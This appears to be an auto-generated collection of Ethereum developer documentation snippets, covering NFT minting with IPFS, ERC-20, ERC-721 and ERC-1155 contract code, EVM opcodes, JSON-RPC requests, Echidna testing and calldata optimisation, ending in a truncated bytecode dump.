\"result\":true\n}\n```\n\n----------------------------------------\n\nTITLE: Setting up Environment Variables for Ethereum Development\nDESCRIPTION: Example of a .env file that stores the Alchemy API URL and MetaMask private key needed for deploying contracts to the Ethereum Goerli testnet.\n\nLANGUAGE: bash\nCODE:\n```\nAPI_URL = \"https://eth-goerli.alchemyapi.io/v2/your-api-key\"\nPRIVATE_KEY = \"your-metamask-private-key\"\n```\n\n----------------------------------------\n\nTITLE: Implementing pinJSONToIPFS Function for Uploading NFT Metadata to IPFS\nDESCRIPTION: Complete implementation of the pinJSONToIPFS function that uses axios to make a POST request to Pinata's API for uploading JSON metadata to IPFS. It returns the IPFS hash URL on success or an error message on failure.\n\nLANGUAGE: javascript\nCODE:\n```\nrequire(\"dotenv\").config()\nconst key = process.env.REACT_APP_PINATA_KEY\nconst secret = process.env.REACT_APP_PINATA_SECRET\n\nconst axios = require(\"axios\")\n\nexport const pinJSONToIPFS = async (JSONBody) => {\n  const url = `https://api.pinata.cloud/pinning/pinJSONToIPFS`\n  //making axios POST request to Pinata ⬇️\n  return axios\n    .post(url, JSONBody, {\n      headers: {\n        pinata_api_key: key,\n        pinata_secret_api_key: secret,\n      },\n    })\n    .then(function (response) {\n      return {\n        success: true,\n        pinataUrl:\n          \"https://gateway.pinata.cloud/ipfs/\" + response.data.IpfsHash,\n      }\n    })\n    .catch(function (error) {\n      console.log(error)\n      return {\n        success: false,\n        message: error.message,\n      }\n    })\n}\n```\n\n----------------------------------------\n\nTITLE: ERC-1155 Receive Hook Magic Value\nDESCRIPTION: Shows how to generate the magic value that an ERC-1155-compatible contract must return from its onERC1155BatchReceived function to indicate successful token receipt. This is part of the receive hook implementation.\n\nLANGUAGE: solidity\nCODE:\n```\nbytes4(keccak256(\"onERC1155BatchReceived(address,address,uint256[],uint256[],bytes)\"))\n```\n\n----------------------------------------\n\nTITLE: RETURN Operation in EVM\nDESCRIPTION: Returns data from memory. Takes offset and length parameters to define the section of memory to return.\n\nLANGUAGE: solidity\nCODE:\n```\nreturn mem[ost:ost+len-1]\n```\n\n----------------------------------------\n\nTITLE: Implementing Emergency Stop Pattern in Solidity Smart Contracts\nDESCRIPTION: This code demonstrates a pattern for implementing an emergency stop mechanism in Ethereum smart contracts. It includes Boolean flags to control contract state, function modifiers to restrict access during emergencies, and functions to stop and resume contract operations.\n\nLANGUAGE: solidity\nCODE:\n```\n// This code has not been professionally audited and makes no promises about safety or correctness. Use at your own risk.\n\ncontract EmergencyStop {\n\n    bool isStopped = false;\n\n    modifier stoppedInEmergency {\n        require(!isStopped);\n        _;\n    }\n\n    modifier onlyWhenStopped {\n        require(isStopped);\n        _;\n    }\n\n    modifier onlyAuthorized {\n        // Check for authorization of msg.sender here\n        _;\n    }\n\n    function stopContract() public onlyAuthorized {\n        isStopped = true;\n    }\n\n    function resumeContract() public onlyAuthorized {\n        isStopped = false;\n    }\n\n    function deposit() public payable stoppedInEmergency {\n        // Deposit logic happening here\n    }\n\n    function emergencyWithdraw() public onlyWhenStopped {\n        // Emergency withdraw happening here\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing Pair Initialization Function\nDESCRIPTION: Defines a function that allows only the factory to specify the two ERC-20 tokens that this pair will exchange. This is called once during deployment.\n\nLANGUAGE: solidity\nCODE:\n```\n// called once by the factory at time of deployment\nfunction initialize(address _token0, address _token1) external {\n    require(msg.sender == factory, 'UniswapV2: FORBIDDEN'); // sufficient check\n    token0 = _token0;\n    token1 = _token1;\n}\n```\n\n----------------------------------------\n\nTITLE: Installing the Server Component Repository using Git and NPM\nDESCRIPTION: Commands to clone the repository and install the necessary Node.js packages for the server component example.\n\nLANGUAGE: shell\nCODE:\n```\ngit clone https://github.com/qbzzt/20240715-server-component.git\ncd 20240715-server-component\n```\n\nLANGUAGE: shell\nCODE:\n```\nnpm install\n```\n\n----------------------------------------\n\nTITLE: Scrypt Web3 Secret Storage Test Vector\nDESCRIPTION: A JSON test vector for Web3 Secret Storage using AES-128-CTR and Scrypt key derivation function. This example includes the required parameters specific to the Scrypt algorithm.\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"crypto\": {\n    \"cipher\": \"aes-128-ctr\",\n    \"cipherparams\": {\n      \"iv\": \"740770fce12ce862af21264dab25f1da\"\n    },\n    \"ciphertext\": \"dd8a1132cf57db67c038c6763afe2cbe6ea1949a86abc5843f8ca656ebbb1ea2\",\n    \"kdf\": \"scrypt\",\n    \"kdfparams\": {\n      \"dklen\": 32,\n      \"n\": 262144,\n      \"p\": 1,\n      \"r\": 8,\n      \"salt\": \"25710c2ccd7c610b24d068af83b959b7a0e5f40641f0c82daeb1345766191034\"\n    },\n    \"mac\": \"337aeb86505d2d0bb620effe57f18381377d67d76dac1090626aa5cd20886a7c\"\n  },\n  \"id\": \"3198bc9c-6672-5ab3-d995-4942343ae5b6\",\n  \"version\": 3\n}\n```\n\n----------------------------------------\n\nTITLE: Checking Approval or Ownership Status for NFT Tokens in Solidity\nDESCRIPTION: This internal function verifies if an address is either the owner of a token or is approved to manage it. It combines three conditions: direct ownership, specific token approval, or operator approval.\n\nLANGUAGE: solidity\nCODE:\n```\nfunction _isApprovedOrOwner(address spender, uint256 pizzaId)\n    internal\n    view\n    returns (bool)\n{\n    address owner = pizzaToOwner[pizzaId];\n    // Disable solium check because of\n    // https://github.com/duaraghav8/Solium/issues/175\n    // solium-disable-next-line operator-whitespace\n    return (spender == owner ||\n        this.getApproved(pizzaId) == spender ||\n        this.isApprovedForAll(owner, spender));\n}\n```\n\n----------------------------------------\n\nTITLE: Expected Output from Block Number Script\nDESCRIPTION: The expected console output after running the script that fetches the latest Ethereum block number. The actual number (11043912) will vary depending on when the script is run.\n\nLANGUAGE: bash\nCODE:\n```\nThe latest block number is 11043912\n```\n\n----------------------------------------\n\nTITLE: Encoding Values for Calldata with Cache Optimization in Solidity\nDESCRIPTION: Creates optimized byte representations of values for calldata, using the cache when possible and different byte lengths based on value size.\n\nLANGUAGE: solidity\nCODE:\n```\n// Get a value, return bytes that will encode it (using the cache if possible)\nfunction encodeVal(uint _val) public view returns(bytes memory) {\n    uint _key = val2key[_val];\n\n    // The value isn't in the cache yet, add it\n    if (_key == 0)\n        return bytes.concat(INTO_CACHE, bytes32(_val));\n\n    // If the key is <0x10, return it as a single byte\n    if (_key < 0x10)\n        return bytes.concat(bytes1(uint8(_key)));\n\n    // Two byte value, encoded as 0x1vvv\n    if (_key < 0x1000)\n        return bytes.concat(bytes2(uint16(_key) | 0x1000));\n\n    // There is probably a clever way to do the following lines as a loop,\n    // but it's a view function so I'm optimizing for programmer time and\n    // simplicity.\n\n    if (_key < 16*256**2)\n        return bytes.concat(bytes3(uint24(_key) | (0x2 * 16 * 256**2)));\n    if (_key < 16*256**3)\n        return bytes.concat(bytes4(uint32(_key) | (0x3 * 16 * 256**3)));\n         .\n         .\n         .\n    if (_key < 16*256**14)\n        return bytes.concat(bytes15(uint120(_key) | (0xE * 16 * 256**14)));\n    if (_key < 16*256**15)\n        return bytes.concat(bytes16(uint128(_key) | (0xF * 16 * 256**15)));\n```\n\n----------------------------------------\n\nTITLE: Defining the CalldataInterpreter Contract with Token Storage\nDESCRIPTION: Defines the CalldataInterpreter contract with an immutable reference to the OrisUselessToken, which will be the token contract it proxies for.\n\nLANGUAGE: solidity\nCODE:\n```\ncontract CalldataInterpreter {\n\n    OrisUselessToken public immutable token;\n```\n\n----------------------------------------\n\nTITLE: ERC-20 Interface Declaration\nDESCRIPTION: Begins the declaration of the IERC20 interface. By convention, interface names start with 'I' to distinguish them from implementation contracts.\n\nLANGUAGE: solidity\nCODE:\n```\ninterface IERC20 {\n```\n\n----------------------------------------\n\nTITLE: CREATE Opcode Implementation in EVM\nDESCRIPTION: The CREATE opcode (0xF0) creates a new contract by computing an address based on the caller's address and nonce. It takes value, memory offset, and length parameters from the stack and returns the new contract address.\n\nLANGUAGE: plaintext\nCODE:\n```\naddr = keccak256(rlp([address(this), this.nonce]))\n```\n\n----------------------------------------\n\nTITLE: REVERT Operation in EVM\nDESCRIPTION: Reverts the current execution with a reason provided from memory. Takes offset and length parameters to define the section of memory containing the error reason.\n\nLANGUAGE: solidity\nCODE:\n```\nrevert(mem[ost:ost+len-1])\n```\n\n----------------------------------------\n\nTITLE: Running Echidna with Configuration File\nDESCRIPTION: Command to execute Echidna with a specific configuration file for testing a smart contract.\n\nLANGUAGE: bash\nCODE:\n```\nechidna-test contract.sol --config config.yaml\n...\n```\n\n----------------------------------------\n\nTITLE: Defining a Subgraph Manifest for The Graph in YAML\nDESCRIPTION: The subgraph.yaml configuration file that defines which smart contracts to index, which events to listen to, and which mapping functions to call. This example targets a GameContract on the Ethereum mainnet.\n\nLANGUAGE: yaml\nCODE:\n```\nspecVersion: 0.0.1\ndescription: Placing Bets on Ethereum\nrepository: - GitHub link -\nschema:\n  file: ./schema.graphql\ndataSources:\n  - kind: ethereum/contract\n    name: GameContract\n    network: mainnet\n    source:\n      address: '0x2E6454...cf77eC'\n      abi: GameContract\n      startBlock: 6175244\n    mapping:\n      kind: ethereum/events\n      apiVersion: 0.0.1\n      language: wasm/assemblyscript\n      entities:\n        - GameContract\n      abis:\n        - name: GameContract\n          file: ../build/contracts/GameContract.json\n      eventHandlers:\n        - event: PlacedBet(address,uint256,bool)\n          handler: handleNewBet\n      file: ./src/mapping.ts\n```\n\n----------------------------------------\n\nTITLE: Defining a Subgraph Manifest for The Graph in YAML\nDESCRIPTION: The subgraph.yaml configuration file that defines which smart contracts to index, which events to listen to, and which mapping functions to call. This example targets a GameContract on the Ethereum mainnet.\n\nLANGUAGE: yaml\nCODE:\n```\nspecVersion: 0.0.1\ndescription: Placing Bets on Ethereum\nrepository: - GitHub link -\nschema:\n  file: ./schema.graphql\ndataSources:\n  - kind: ethereum/contract\n    name: GameContract\n    network: mainnet\n    source:\n      address: '0x2E6454...cf77eC'\n      abi: GameContract\n      startBlock: 6175244\n    mapping:\n      kind: ethereum/events\n      apiVersion: 0.0.1\n      language: wasm/assemblyscript\n      entities:\n        - GameContract\n      abis:\n        - name: GameContract\n          file: ../build/contracts/GameContract.json\n      eventHandlers:\n        - event: PlacedBet(address,uint256,bool)\n          handler: handleNewBet\n      file: ./src/mapping.ts\n```\n\n----------------------------------------\n\nTITLE: Enabling Assertion Checking in Echidna Configuration\nDESCRIPTION: YAML configuration file that enables assertion checking in Echidna by setting checkAsserts to true.\n\nLANGUAGE: yaml\nCODE:\n```\ncheckAsserts: true\n```\n\n----------------------------------------\n\nTITLE: Determining Contract Address Based on Chain ID\nDESCRIPTION: Sets the contract address for the Greeter based on the current blockchain network, using the chain ID to look up the appropriate address from the predefined mapping.\n\nLANGUAGE: tsx\nCODE:\n```\n  const greeterAddr = chain && contractAddrs[chain.id]\n```\n\n----------------------------------------\n\nTITLE: Game Initialization Flow with PostDeploy Script\nDESCRIPTION: The PostDeploy.s.sol script sets up the game configuration, defining a 10x5 minefield with eight mines.\n\nLANGUAGE: Solidity\nCODE:\n```\n// From PostDeploy.s.sol line 23\n// Sets up a 10x5 minefield with eight mines in it\n```\n\n----------------------------------------\n\nTITLE: Taking Ownership of Pizza Token in Solidity\nDESCRIPTION: Function that allows approved users to take ownership of a Pizza token. It verifies the caller is approved before transferring the token from the current owner to the caller.\n\nLANGUAGE: solidity\nCODE:\n```\nfunction takeOwnership(uint256 _pizzaId) public {\n        require(_isApprovedOrOwner(msg.sender, _pizzaId), \"Address is not approved.\");\n        address owner = this.ownerOf(_pizzaId);\n        this.transferFrom(owner, msg.sender, _pizzaId);\n    }\n```\n\n----------------------------------------\n\nTITLE: Creating and Uploading NFT Metadata to IPFS in Ethereum\nDESCRIPTION: Initializes the mintNFT function with error handling and metadata creation for an NFT. This function validates input parameters, creates a metadata object, and uploads it to IPFS using the pinJSONToIPFS function.\n\nLANGUAGE: javascript\nCODE:\n```\nexport const mintNFT = async (url, name, description) => {\n  //error handling\n  if (url.trim() == \"\" || name.trim() == \"\" || description.trim() == \"\") {\n    return {\n      success: false,\n      status: \"❗Please make sure all fields are completed before minting.\",\n    }\n  }\n\n  //make metadata\n  const metadata = new Object()\n  metadata.name = name\n  metadata.image = url\n  metadata.description = description\n\n  //make pinata call\n  const pinataResponse = await pinJSONToIPFS(metadata)\n  if (!pinataResponse.success) {\n    return {\n      success: false,\n      status: \"😢 Something went wrong while uploading your tokenURI.\",\n    }\n  }\n  const tokenURI = pinataResponse.pinataUrl\n}\n```\n\n----------------------------------------\n\nTITLE: Requête et réponse de web3_clientVersion en JavaScript\nDESCRIPTION: Exemple de requête et réponse pour obtenir la version actuelle du client Ethereum en utilisant la méthode web3_clientVersion.\n\nLANGUAGE: javascript\nCODE:\n```\n// Request\ncurl -X POST --data '{\"jsonrpc\":\"2.0\",\"method\":\"web3_clientVersion\",\"params\":[],\"id\":67}'\n// Result\n{\n  \"id\":67,\n  \"jsonrpc\":\"2.0\",\n  \"result\": \"Geth/v1.12.1-stable/linux-amd64/go1.19.1\"\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing isApprovedForAll Function for ERC-721 in Vyper\nDESCRIPTION: View function that checks if an operator address is approved to manage all tokens owned by a specific address.\n\nLANGUAGE: vyper\nCODE:\n```\n@view\n@external\ndef isApprovedForAll(_owner: address, _operator: address) -> bool:\n    \"\"\"\n    @dev Checks if `_operator` is an approved operator for `_owner`.\n    @param _owner The address that owns the NFTs.\n    @param _operator The address that acts on behalf of the owner.\n    \"\"\"\n    return (self.ownerToOperators[_owner])[_operator]\n```\n\n----------------------------------------\n\nTITLE: Calculating Storage Position for Mappings\nDESCRIPTION: JavaScript example showing how to calculate the position of an element in a mapping for storage access. This is necessary when accessing mapping values through eth_getStorageAt because mapping values are stored at hashed locations.\n\nLANGUAGE: javascript\nCODE:\n```\nkeccak(LeftPad32(key, 0), LeftPad32(map position, 0))\n```\n\n----------------------------------------\n\nTITLE: Approving Tokens and Creating Transfer Transaction with Custom Calldata\nDESCRIPTION: Approves the interpreter contract to transfer tokens and creates a transaction with custom calldata for token transfer, then verifies the resulting balances.\n\nLANGUAGE: javascript\nCODE:\n```\n    // Give the CDI an allowance (approvals cannot be proxied)\n    const approveTX = await token.approve(cdi.address, 10000)\n    await approveTX.wait()\n    expect(await token.allowance(signer.address, cdi.address)).to.equal(10000)\n    \n    // Transfer tokens\n    const destAddr = \"0xf5a6ead936fb47f342bb63e676479bddf26ebe1d\"\n    const transferTx = {\n      to: cdi.address,\n      data: \"0x02\" + destAddr.slice(2, 42) + \"0100\",\n    }\n    await (await signer.sendTransaction(transferTx)).wait()\n\n    // Check that we have 256 tokens less\n    expect (await token.balanceOf(signer.address)).to.equal(1000-256)\n\n    // And that our destination got them\n    expect (await token.balanceOf(destAddr)).to.equal(256)\n  })    // it\n})      // describe\n```\n\n----------------------------------------\n\nTITLE: Sample JSON Response for Ethereum Balance Check\nDESCRIPTION: Example JSON response from using Alchemy's eth_getBalance API call to check the ETH balance of an address on the Goerli testnet. The result is returned in wei (smallest unit of ETH).\n\nLANGUAGE: json\nCODE:\n```\n{ \"jsonrpc\": \"2.0\", \"id\": 0, \"result\": \"0x2B5E3AF16B1880000\" }\n```\n\n----------------------------------------\n\nTITLE: eth_getBlockTransactionCountByNumber Parameters Example\nDESCRIPTION: A JavaScript example showing the parameters for the eth_getBlockTransactionCountByNumber method, which retrieves the number of transactions in a block identified by its block number.\n\nLANGUAGE: javascript\nCODE:\n```\nparams: [\n  \"0x13738ca\", // 20396234\n]\n```\n\n----------------------------------------\n\nTITLE: Deploying Contracts to Local Blockchain\nDESCRIPTION: Command to deploy the MUD framework contracts to the local Anvil blockchain using the MUD CLI tools.\n\nLANGUAGE: shell\nCODE:\n```\ncd packages/contracts\npnpm mud dev-contracts --rpc http://127.0.0.1:8545\n```\n\n----------------------------------------\n\nTITLE: Ensuring Pizza Token Uniqueness in Solidity\nDESCRIPTION: Modifier that ensures a Pizza token is unique by checking if a token with the same name and DNA already exists. It iterates through all existing tokens and compares their name hashes and DNA values.\n\nLANGUAGE: solidity\nCODE:\n```\nmodifier isUnique(string memory _name, uint256 _dna) {\n        bool result = true;\n        for (uint256 i = 0; i < pizzas.length; i++) {\n            if (\n                keccak256(abi.encodePacked(pizzas[i].name)) ==\n                keccak256(abi.encodePacked(_name)) &&\n                pizzas[i].dna == _dna\n            ) {\n                result = false;\n            }\n        }\n        require(result, \"Pizza with such name already exists.\");\n        _;\n    }\n```\n\n----------------------------------------\n\nTITLE: Setting up Alchemy Web3 Endpoint and Smart Contract Connection\nDESCRIPTION: Code for initializing Alchemy Web3 connection to interact with the Ethereum blockchain, importing the smart contract ABI, and setting the contract address for NFT minting.\n\nLANGUAGE: javascript\nCODE:\n```\nrequire(\"dotenv\").config()\nconst alchemyKey = process.env.REACT_APP_ALCHEMY_KEY\nconst { createAlchemyWeb3 } = require(\"@alch/alchemy-web3\")\nconst web3 = createAlchemyWeb3(alchemyKey)\n\nconst contractABI = require(\"../contract-abi.json\")\nconst contractAddress = \"0x4C4a07F737Bf57F6632B6CAB089B78f62385aCaE\"\n```\n\n----------------------------------------\n\nTITLE: Minting ERC-721 Token Implementation\nDESCRIPTION: The complete mint function implementation includes authorization checks, verification that the recipient address is valid, and the actual token creation logic. It emits a Transfer event from the zero address.\n\nLANGUAGE: python\nCODE:\n```\n\"\"\"\n@dev Function to mint tokens\n     Throws if `msg.sender` is not the minter.\n     Throws if `_to` is zero address.\n     Throws if `_tokenId` is owned by someone.\n@param _to The address that will receive the minted tokens.\n@param _tokenId The token id to mint.\n@return A boolean that indicates if the operation was successful.\n\"\"\"\n# Throws if `msg.sender` is not the minter\nassert msg.sender == self.minter\n\n# Throws if `_to` is zero address\nassert _to != ZERO_ADDRESS\n# Add NFT. Throws if `_tokenId` is owned by someone\nself._addTokenTo(_to, _tokenId)\nlog Transfer(ZERO_ADDRESS, _to, _tokenId)\nreturn True\n```\n\n----------------------------------------\n\nTITLE: SWAP Operations in Ethereum EVM (SWAP1-SWAP16)\nDESCRIPTION: SWAP operations exchange values at different positions in the stack. All SWAP operations have a gas cost of 3. The index number indicates the depth of the second item to swap with the top item.\n\nLANGUAGE: opcodes\nCODE:\n```\n90   SWAP1    // Swap 1st and 2nd stack items: a, b → b, a\n91   SWAP2    // Swap 1st and 3rd stack items: a, _, b → b, _, a\n92   SWAP3    // Swap 1st and 4th stack items: a, _, _, b → b, _, _, a\n93   SWAP4    // Swap 1st and 5th stack items: a, _, _, _, b → b, _, _, _, a\n94   SWAP5    // Swap 1st and 6th stack items: a, ..., b → b, ..., a\n95   SWAP6    // Swap 1st and 7th stack items: a, ..., b → b, ..., a\n96   SWAP7    // Swap 1st and 8th stack items: a, ..., b → b, ..., a\n97   SWAP8    // Swap 1st and 9th stack items: a, ..., b → b, ..., a\n98   SWAP9    // Swap 1st and 10th stack items: a, ..., b → b, ..., a\n99   SWAP10   // Swap 1st and 11th stack items: a, ..., b → b, ..., a\n9A   SWAP11   // Swap 1st and 12th stack items: a, ..., b → b, ..., a\n9B   SWAP12   // Swap 1st and 13th stack items: a, ..., b → b, ..., a\n9C   SWAP13   // Swap 1st and 14th stack items: a, ..., b → b, ..., a\n9D   SWAP14   // Swap 1st and 15th stack items: a, ..., b → b, ..., a\n9E   SWAP15   // Swap 1st and 16th stack items: a, ..., b → b, ..., a\n9F   SWAP16   // Swap 1st and 17th stack items: a, ..., b → b, ..., a\n```\n\n----------------------------------------\n\nTITLE: CREATE2 Opcode Implementation in EVM\nDESCRIPTION: The CREATE2 opcode (0xF5) provides deterministic contract creation with an additional salt parameter. It computes the contract address using a different formula than CREATE, allowing address prediction before deployment.\n\nLANGUAGE: plaintext\nCODE:\n```\naddr = keccak256(0xff ++ address(this) ++ salt ++ keccak256(mem[ost:ost+len-1]))[12:]\n```\n\n----------------------------------------\n\nTITLE: ETH-Specific Functions and Events in IL1StandardBridge\nDESCRIPTION: Defines the remaining ETH-specific events and functions in the IL1StandardBridge interface, which mirror the ERC-20 functions but handle native ETH transfers between L1 and L2.\n\nLANGUAGE: solidity\nCODE:\n```\n    event ETHWithdrawalFinalized(\n        .\n        .\n        .\n    );\n\n    /********************\n     * Public Functions *\n     ********************/\n\n    /**\n     * @dev Deposit an amount of the ETH to the caller's balance on L2.\n            .\n            .\n            .\n     */\n    function depositETH(uint32 _l2Gas, bytes calldata _data) external payable;\n\n    /**\n     * @dev Deposit an amount of ETH to a recipient's balance on L2.\n            .\n            .\n            .\n     */\n    function depositETHTo(\n        address _to,\n        uint32 _l2Gas,\n        bytes calldata _data\n    ) external payable;\n\n    /*************************\n     * Cross-chain Functions *\n     *************************/\n\n    /**\n     * @dev Complete a withdrawal from L2 to L1, and credit funds to the recipient's balance of the\n     * L1 ETH token. Since only the xDomainMessenger can call this function, it will never be called\n     * before the withdrawal is finalized.\n                .\n                .\n                .\n     */\n    function finalizeETHWithdrawal(\n        address _from,\n        address _to,\n        uint256 _amount,\n        bytes calldata _data\n    ) external;\n}\n```\n\n----------------------------------------\n\nTITLE: SELFDESTRUCT Opcode (FF) Implementation in Spanish\nDESCRIPTION: The SELFDESTRUCT opcode (FF) destroys the current contract and sends all its ETH to the specified address. This line describes the behavior in Spanish.\n\nLANGUAGE: text\nCODE:\n```\nenvía todos los ETH a `addr`; si se ejecuta en la misma transacción en la que se creó el contrato lo destruye\n```\n\n----------------------------------------\n\nTITLE: SELFDESTRUCT Opcode (FF) Implementation in Spanish\nDESCRIPTION: The SELFDESTRUCT opcode (FF) destroys the current contract and sends all its ETH to the specified address. This line describes the behavior in Spanish.\n\nLANGUAGE: text\nCODE:\n```\nenvía todos los ETH a `addr`; si se ejecuta en la misma transacción en la que se creó el contrato lo destruye\n```\n\n----------------------------------------\n\nTITLE: Testing Long Calldata Handling in Solidity\nDESCRIPTION: A test function that verifies the contract correctly handles an excessively long buffer by ignoring the extra data. It sends five values, with the fifth being ignored because it's not a valid cache entry.\n\nLANGUAGE: solidity\nCODE:\n```\n    // Test what with an excessively long buffer everything works file\n    function testLongCalldata() public {\n        address _cacheAddr = address(cache);\n        bool _success;\n        bytes memory _callInput;\n        bytes memory _callOutput;\n\n        // First call, the cache is empty\n        _callInput = bytes.concat(\n            FOUR_PARAMS,\n\n            // First value, add it to the cache\n            cache.INTO_CACHE(), bytes32(VAL_A),\n\n            // Second value, add it to the cache\n            cache.INTO_CACHE(), bytes32(VAL_B),\n\n            // Third value, add it to the cache\n            cache.INTO_CACHE(), bytes32(VAL_C),\n\n            // Fourth value, add it to the cache\n            cache.INTO_CACHE(), bytes32(VAL_D),\n\n            // And another value for \"good luck\"\n            bytes4(0x31112233)\n        );\n        (_success, _callOutput) = _cacheAddr.call(_callInput);\n        assertEq(_success, true);\n        .\n        .\n        .\n    }   // testLongCalldata\n\n}        // CacheTest\n```\n\n----------------------------------------\n\nTITLE: Testing the CalldataInterpreter with JavaScript\nDESCRIPTION: This JavaScript test demonstrates how to interact with the CalldataInterpreter contract by sending transactions with compact calldata. It shows faucet requests and token transfers using the optimized encoding format.\n\nLANGUAGE: javascript\nCODE:\n```\nconst { expect } = require(\"chai\");\n\ndescribe(\"CalldataInterpreter\", function () {\n  it(\"Should let us use tokens\", async function () {\n    const Token = await ethers.getContractFactory(\"OrisUselessToken\")\n    const token = await Token.deploy()\n    await token.deployed()\n    console.log(\"Token addr:\", token.address)\n\n    const Cdi = await ethers.getContractFactory(\"CalldataInterpreter\")\n    const cdi = await Cdi.deploy(token.address)\n    await cdi.deployed()\n    console.log(\"CalldataInterpreter addr:\", cdi.address)\n\n    const signer = await ethers.getSigner()\n```\n\nLANGUAGE: javascript\nCODE:\n```\n    // Get tokens to play with\n    const faucetTx = {\n```\n\nLANGUAGE: javascript\nCODE:\n```\n      to: cdi.address,\n      data: \"0x01\"\n```\n\nLANGUAGE: javascript\nCODE:\n```\n    }\n    await (await signer.sendTransaction(faucetTx)).wait()\n```\n\nLANGUAGE: javascript\nCODE:\n```\n// Check the faucet provides the tokens correctly\nexpect(await token.balanceOf(signer.address)).to.equal(1000)\n```\n\nLANGUAGE: javascript\nCODE:\n```\n// Give the CDI an allowance (approvals cannot be proxied)\nconst approveTX = await token.approve(cdi.address, 10000)\nawait approveTX.wait()\nexpect(await token.allowance(signer.address, cdi.address)).to.equal(10000)\n```\n\nLANGUAGE: javascript\nCODE:\n```\n// Transfer tokens\nconst destAddr = \"0xf5a6ead936fb47f342bb63e676479bddf26ebe1d\"\nconst transferTx = {\n  to: cdi.address,\n  data: \"0x02\" + destAddr.slice(2, 42) + \"0100\",\n}\n```\n\nLANGUAGE: javascript\nCODE:\n```\n    await (await signer.sendTransaction(transferTx)).wait()\n\n    // Check that we have 256 tokens less\n    expect (await token.balanceOf(signer.address)).to.equal(1000-256)\n\n    // And that our destination got them\n    expect (await token.balanceOf(destAddr)).to.equal(256)\n  })    // it\n})      // describe\n```\n\n----------------------------------------\n\nTITLE: Basic JSON-RPC Request with Curl\nDESCRIPTION: An example of a complete curl request to an Ethereum node with proper headers. This shows the basic format for all JSON-RPC API calls.\n\nLANGUAGE: shell\nCODE:\n```\ncurl -H \"Content-Type: application/json\" -X POST --data '{\"jsonrpc\":\"2.0\",\"method\":\"web3_clientVersion\",\"params\":[],\"id\":67}' 127.0.0.1:8545\n```\n\n----------------------------------------\n\nTITLE: Verifying Client Software Hash Using SHA256 in Shell\nDESCRIPTION: This snippet demonstrates how to verify the integrity of downloaded client software by calculating its SHA256 hash and comparing it with the hash provided by developers. This is a security measure to ensure the software hasn't been tampered with.\n\nLANGUAGE: shell\nCODE:\n```\nsha256sum teku-22.6.1.tar.gz\n\n9b2f8c1f8d4dab0404ce70ea314ff4b3c77e9d27aff9d1e4c1933a5439767dde\n```\n\n----------------------------------------\n\nTITLE: ERC20 Token Contract Deployed Bytecode\nDESCRIPTION: The deployed bytecode segment of an ERC20 token contract showing function implementations for token transfer, approval, balance checking, and other standard ERC20 operations. This bytecode implements the full ERC20 standard interface with additional error handling and safety features.\n\nLANGUAGE: EVM Bytecode\nCODE:\n```\n608060405234801561001057600080fd5b50600436106100a95760003560e01c80633950935111610071578063395093511461025f57806370a08231146102c557806395d89b411461031d578063a457c2d7146103a0578063a9059cbb14610406578063dd62ed3e1461046c576100a9565b806306fdde03146100ae578063095ea7b31461013157806318160ddd1461019757806323b872dd146101b5578063313ce5671461023b575b600080fd5b6100b66104e4565b6040518080602001828103825283818151815260200191508051906020019080838360005b838110156100f65780820151818401526020810190506100db565b50505050905090810190601f1680156101235780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b61017d6004803603604081101561014757600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919080359060200190929190505050610586565b604051808215151515815260200191505060405180910390f35b61019f6105a4565b6040518082815260200191505060405180910390f35b610221600480360360608110156101cb57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190803573ffffffffffffffffffffffffffffffffffffffff169060200190929190803590602001909291905050506105ae565b604051808215151515815260200191505060405180910390f35b610243610687565b604051808260ff1660ff16815260200191505060405180910390f35b6102ab6004803603604081101561027557600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff1690602001909291908035906020019092919050505061069e565b604051808215151515815260200191505060405180910390f35b610307600480360360208110156102db57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610751565b6040518082815260200191505060405180910390f35b610325610799565b6040518080602001828103825283818151815260200191508051906020019080838360005b8381101561036557808201518184015260208101905061034a565b50505050905090810190601f1680156103925780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b6103ec600480360360408110156103b657600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff1690602001909291908035906020019092919050505061083b565b604051808215151515815260200191505060405180910390f35b6104526004803603604081101561041c57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919080359060200190929190505050610908565b604051808215151515815260200191505060405180910390f35b6104ce6004803603604081101561048257600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610926565b6040518082815260200191505060405180910390f35b606060038054600181600116156101000203166002900480601f01602080910402602001604051908101604052809291908181526020018280546001816001161561010002031660029004801561057c5780601f106105515761010080835404028352916020019161057c565b820191906000526020600020905b81548152906001019060200180831161055f57829003601f168201915b5050505050905090565b600061059a6105936109ad565b84846109b5565b6001905092915050565b6000600254905090565b60006105bb848484610bac565b61067c846105c76109ad565b6106778560405180606001604052806028815260200161102660289139600160008b73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600061062d6109ad565b73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054610e6d9092919063ffffffff16565b6109b5565b600190509392505050565b6000600560009054906101000a900460ff16905090565b60006107476106ab6109ad565b8461074285600160006106bc6109ad565b73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008973ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054610f2d90919063ffffffff16565b6109b5565b6001905092915050565b60008060008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020549050919050565b606060048054600181600116156101000203166002900480601f0160208091040260200160405190810160405280929190818152602001828054600181600116156101000203166002900480156108315780601f1061080657610100808354040283529160200191610831565b820191906000526020600020905b81548152906001019060200180831161081457829003601f168201915b5050505050905090565b60006108fe6108486109ad565b846108f98560405180606001604052806025815260200161109760259139600160006108726109ad565b73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008a73ffffffffffffffffff